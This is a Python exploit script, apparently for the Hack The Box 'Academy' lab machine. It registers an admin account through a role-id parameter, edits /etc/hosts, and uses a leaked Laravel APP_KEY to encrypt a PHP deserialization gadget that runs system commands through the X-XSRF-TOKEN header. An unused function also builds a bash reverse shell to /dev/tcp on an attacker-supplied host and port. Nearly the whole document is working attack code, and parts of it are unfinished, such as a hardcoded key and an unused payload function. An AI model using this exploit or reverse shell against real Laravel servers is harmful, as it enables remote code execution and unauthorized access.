#!/usr/bin/env python3

import argparse
import re
import requests
import rich
import sys
import time
import os
import base64
from Crypto.Cipher import AES
from hashlib import sha256
from Crypto.Util.Padding import pad
import hmac
import json
import signal
import pdb
# Argument parser
parser = argparse.ArgumentParser()
parser.add_argument("-rhost", "--rhost", help="Remote host", required=True)
parser.add_argument("-lhost", "--lhost", help="Local host", required=True)
parser.add_argument("-lport", "--lport", help="Local port", required=True)
parser.add_argument("-c", "--command", help="command", required=True)

args = parser.parse_args()
lhost = args.lhost
lport = args.lport
rhost = args.rhost
com = args.command

main_url = "http://academy.htb/"

# Check if the script is run as root:
if not os.geteuid() == 0:
    rich.print("[yellow][+] Consider running this script as root! [/yellow]")
    sys.exit(1)

def checkHosts():
    # Check if academy.htb is added to /etc/hosts1
    with open('/etc/hosts', 'r') as file:
        data = file.read().replace('\n', '')
        if "academy.htb" not in data:
            rich.print("[red][!] academy.htb is not added to /etc/hosts [/red]")
            time.sleep(1)
            rich.print("[yellow][!] Adding it to /etc/hosts [/yellow]")
            time.sleep(1)
            os.system(f"echo '{lhost} academy.htb' >> /etc/hosts")

def MakeRequest():
    s = requests.Session()
    # Create an account
    data = {
        'uid': 'rootme',
        'password': 'rootme',
        'confirm': 'rootme',
        'roleid': '1'
    }

    cookies = {
        'PHPSESSID': 'qlk0p3q8nbigpddhnr24r5l58l'
    }

    register_url= main_url + "register.php"
    try:
        r = s.post(register_url, data=data, cookies=cookies)
        if r.status_code == 200:
            rich.print("[green][+] Account created successfully. [/green]")
            rich.print("[yellow][+] Credentials -> rootme:rootme [/yellow]")
    except:
        rich.print("[red][!] Failed to create an account [/red]")

    # Add new host to /etc/hosts
    rich.print("[yellow][+] New host discovered: dev-staging-01.academy.htb -> Adding it to /etc/hosts [/yellow]")
    with open('/etc/hosts', 'r') as file:
        data = file.read().replace('\n', '')
        if "dev-staging-01.academy.htb" not in data:
            time.sleep(1)
            os.system(f"echo '{lhost} dev-staging-01.academy.htb' >> /etc/hosts")

def generatePayload():
    # Extract API_KEY
    s = requests.get("http://dev-staging-01.academy.htb/")
    source_code = s.text
    pattern = r'base64:([\w/+]+=*)'
    api_key = re.search(pattern, source_code)[1]

    # Generate payload
    cmd = f"bash -c 'bash -i >& /dev/tcp/{lhost}/{lport} 0>&1'"
    payload_decoded = 'O:40:"Illuminate\\Broadcasting\\PendingBroadcast":2:{s:9:"' + "\x00" + '*' + "\x00" + 'events";O:15:"Faker\\Generator":1:{s:13:"' + "\x00" + '*' + "\x00" + 'formatters";a:1:{s:8:"dispatch";s:6:"system";}}s:8:"' + "\x00" + '*' + "\x00" + 'event";s:' + str(len(cmd)) + ':"' + cmd + '";}'
    value = base64.b64encode(payload_decoded.encode()).decode('utf-8')
    key = base64.b64decode(api_key)



def Exploit():
    rich.print("[blue][+] Laravel 5.X version detected. [/blue]")
    rich.print("[yellow][+] Exploiting it... [/yellow]")
    key = b'dBLUaMuZz7Iq06XtL/Xnz/90Ejq+DEEynggqubHWFj0='
    comand = com
    payload = 'O:40:"Illuminate\\Broadcasting\\PendingBroadcast":2:{s:9:"' + "\x00" + '*' + "\x00" + 'events";O:15:"Faker\\Generator":1:{s:13:"' + "\x00" + '*' + "\x00" + 'formatters";a:1:{s:8:"dispatch";s:6:"system";}}s:8:"' + "\x00" + '*' + "\x00" + 'event";s:' + str(
        len(comand)) + ':"' + comand + '";}'

    # Base64 encoded
    base64_payload = base64.b64encode(payload.encode()).decode('utf-8')

    # Base64 decoded key
    base64_decoded_key = base64.b64decode(key)

    # AES Encrypt the payload:
    cipher = AES.new(base64_decoded_key, AES.MODE_CBC)
    value = cipher.encrypt(pad(base64.b64decode(base64_payload), AES.block_size))
    payload_def = base64.b64encode(value)

    # IV base64 encoded
    iv_base64 = base64.b64encode(cipher.iv)

    # Hashing mac
    hashed_mac = hmac.new(base64_decoded_key, iv_base64 + payload_def, sha256).hexdigest()

    # Decoded from base64
    iv_decoded_base64 = iv_base64.decode('utf-8')
    payload_decoded_base64 = payload_def.decode('utf-8')

    # Data that will be sent through the request
    data = {
        'iv': iv_decoded_base64,
        'value': payload_decoded_base64,
        'mac': hashed_mac
    }

    # Json form data
    json_data = json.dumps(data)

    # Final payload encoded
    final_payload_encoded = base64.b64encode(json_data.encode()).decode('utf-8')

    headers = {
        'X-XSRF-TOKEN': final_payload_encoded
    }

    proxy = {
        'http': 'http://localhost:8080',
        'https': 'https://localhost:8080'
    }

    url = "http://dev-staging-01.academy.htb/"
    r = requests.post(url=url, headers=headers)

    print(r.text.split('<!DOCTYPE html>')[0])

if __name__ == "__main__":
    checkHosts()
    MakeRequest()
    Exploit()
